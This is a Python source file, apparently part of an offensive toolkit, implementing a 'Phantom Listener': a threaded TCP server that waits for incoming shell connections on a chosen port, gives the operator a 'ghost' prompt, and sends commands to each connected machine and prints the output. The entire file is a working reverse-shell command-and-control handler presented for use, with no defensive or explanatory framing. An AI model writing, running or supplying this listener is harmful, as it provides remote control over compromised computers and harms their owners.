import socket
import threading
from rich.console import Console
from core.ui import draw_header

console = Console()

def handle_ghost(client_socket, address):
    """Handles an individual shell connection."""
    console.print(f"[bold green][+] Connection established from {address[0]}:{address[1]}[/bold green]")
    try:
        while True:
            # Ghost prompt simulating a remote terminal
            cmd = console.input(f"[bold red]ghost[/bold red]@[{address[0]}]:~$ ").strip()
            
            if not cmd: continue
            if cmd.lower() in ["exit", "quit"]:
                client_socket.send(b"exit")
                break
                
            client_socket.send(cmd.encode())
            response = client_socket.recv(4096).decode()
            console.print(response)
            
    except Exception as e:
        console.print(f"[bold red][!] Connection lost: {e}[/bold red]")
    finally:
        client_socket.close()

def start_listener():
    draw_header("Phantom Listener")
    port = console.input("[bold yellow]Enter Port to listen on (e.g. 4444): [/bold yellow]")
    
    if not port: return
    
    # 
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind(("0.0.0.0", int(port)))
        server.listen(5)
        console.print(f"[bold cyan][*] Listener active on 0.0.0.0:{port}. Waiting for ghosts...[/bold cyan]")
        console.print("[dim]Press CTRL+C to stop the listener.[/dim]")
        
        while True:
            client, addr = server.accept()
            # Power improvement: Threading allows multiple shells at once
            ghost_thread = threading.Thread(target=handle_ghost, args=(client, addr))
            ghost_thread.start()
            
    except KeyboardInterrupt:
        console.print("\n[yellow][!] Shutting down listener...[/yellow]")
    except Exception as e:
        console.print(f"[bold red][!] Error: {e}[/bold red]")
    finally:
        server.close()
        input("\nPress Enter to return...")